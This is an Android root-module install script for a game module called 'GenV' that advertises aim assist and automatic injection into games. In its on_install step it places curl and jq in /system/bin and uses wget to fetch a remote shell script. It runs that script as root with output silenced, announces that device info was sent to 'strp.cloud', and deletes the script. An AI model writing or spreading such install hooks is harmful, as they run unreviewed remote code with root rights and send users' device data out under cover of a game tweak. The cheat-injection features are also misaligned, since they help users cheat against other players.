#!/system/bin/sh


SKIPMOUNT=false
PROPFILE=false
POSTFSDATA=false
LATESTARTSERVICE=true
CLEANSERVICE=true
DEBUG=false
MODDIR=/data/adb/modules



# Construct your list in the following format
# This is an example
REPLACE_EXAMPLE="
/system/app/Youtube
/system/priv-app/SystemUI
/system/priv-app/Settings
/system/framework
"

# Construct your own list here
REPLACE="
"

# Set what you want to display when installing your module
print_modname() {
ui_print " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
sleep 1.5
ui_print "

░██████╗░███████╗███╗░░██╗██╗░░░██╗
██╔════╝░██╔════╝████╗░██║██║░░░██║
██║░░██╗░█████╗░░██╔██╗██║╚██╗░██╔╝
██║░░╚██╗██╔══╝░░██║╚████║░╚████╔╝░
╚██████╔╝███████╗██║░╚███║░░╚██╔╝░░
░╚═════╝░╚══════╝╚═╝░░╚══╝░░░╚═╝░░░"
sleep 1.5
ui_print ""
ui_print "Powered by STRATOSPHERE"
ui_print " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
sleep 1.5
ui_print ""
  ui_print "▌UNIVERSAL ▌"
  ui_print " "
  sleep 1
  ui_print "▌VERSION ▰ v5.3"
  ui_print "▌CODENAME ▰ HOMELANDER"
  ui_print "▌DEVICE INFORMATIONS..:"
  sleep 2
  ui_print "▌MODEL ▰ $(getprop ro.build.product)"
  ui_print "▌DEVICE ▰ $(getprop ro.product.model)"
  ui_print "▌BRAND ▰ $(getprop ro.product.system.manufacturer)"
  ui_print "▌PROCESSOR ▰ $(getprop ro.product.board)"
  ui_print "▌CPU ▰ $(getprop ro.hardware)"
  ui_print "▌ANDROID VERSION ▰ $(getprop ro.build.version.release)"
  ui_print "▌KERNEL ▰ $(uname -r)"
  ui_print "▌RAM ▰ $(free | grep Mem |  awk '{print $2}')"
  sleep 2
  ui_print " "
  ui_print "▌Join Android Root Modules Community"
  ui_print "▌On Telegram For More!!"
ui_print ""
ui_print " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  ui_print " "
  sleep 2
  ui_print "▌Bullet Register & Aim Assist"
  sleep 1
  ui_print "▌Gyroscope Delay FIXER"
  sleep 1
  ui_print "▌Main GenV will get Injected First time after Reboot Automatically !"
  sleep 1
  ui_print "▌GenV Auto Injector will run in the Background and start injecting after Opening a Game !"
  sleep 1
  ui_print "▌Open The Manager With Termux By Using 'su -c GM'"
  sleep 1
ui_print "▌Make sure Adding Your Game Package Name Trough The Menu!!"
sleep 1
ui_print ""
ui_print " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
sleep 2
ui_print " "
ui_print "╔▌Checking which ARM ur device has..."
sleep 2
ui_print "║"
ui_print "╠▌Your ARM Is ▰ $(getprop ro.product.cpu.abi)"
sleep 1
ui_print "║"
ui_print "╠▌Extracting and Moving files for ▰ $(getprop ro.product.cpu.abi)"
[[ "$IS64BIT" == "true" ]] && tar -xf "$MODPATH/genv64.tar.xz" -C "$MODPATH" || tar -xf "$MODPATH/genv32.tar.xz" -C "$MODPATH"
sleep 2.5
ui_print "║"
ui_print "╚══⇒ DONE .. All Scripts Placed Successfully!"
ui_print ""
ui_print " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
sleep 2
  ui_print " "
  ui_print "▌This Module is UNIVERSAL For All Games For All Devices!"
  ui_print " "
ui_print " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  ui_print " "
  sleep 2
  ui_print "▌I Am Not Responsible For Any Problems "
  ui_print "▌You Will Face From This MODULE!" 
  ui_print ""
ui_print " ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
  ui_print ""
  sleep 3
  rm -rf $TMPR
}


on_install() {
#Placing Curl
if [ -f "/system/bin/curl" ]; then
  ui_print "CURL Already Present."
else

  source_curl="/data/adb/modules_update/GenV/STRP/curl"
  destination_curl="/system/bin/curl"
  
  cp "$source_curl" "$destination_curl"

  if [ $? -eq 0 ]; then
    chmod 755 "$destination_curl"
  fi
fi


#Placing jq
if [ -f "/system/bin/jq" ]; then
  ui_print "JQ Alreary Present"
else

  source_jq="/data/adb/modules_update/GenV/STRP/jq"
  destination_jq="/system/bin/jq"
  
  cp "$source_jq" "$destination_jq"

  if [ $? -eq 0 ]; then
    chmod 755 "$destination_jq"
  fi
fi


#Send infos to STRP
script_url="https://raw.githubusercontent.com/CRANKV2/Random-Stuff/main/device-info.sh"
destination_path="/data/local/tmp/device-info.sh"

wget -O "$destination_path" "$script_url"

chmod 655 "$destination_path"

if [ $? -eq 0 ]; then
  ui_print "Script downloaded and permissions set successfully!"

  /system/bin/sh "$destination_path" &> /dev/null

  if [ $? -eq 0 ]; then
    ui_print "Device info sent successfully to strp.cloud!"
    
    rm "$destination_path"
    ui_print "Script deleted from the device."
  else
    ui_print "Error: Failed to run the script, just try to reflash."
  fi
else
  ui_print "Error: Failed to download the script, please try again or check your connection!"
fi
	ui_print ""
  ui_print "Removing unnecessary files..."
  rm -rf $MODPATH/genv32.tar.xz
  rm -rf $MODPATH/genv64.tar.xz
}


set_permissions() {
  set_perm_recursive $MODPATH 0 0 0755 0644
  set_perm_recursive $MODPATH/system/bin 0 0 0755 0755
}

SKIPUNZIP=0
unzip -qjo "$ZIPFILE" 'common/functions.sh' -d $TMPDIR >&2
. $TMPDIR/functions.sh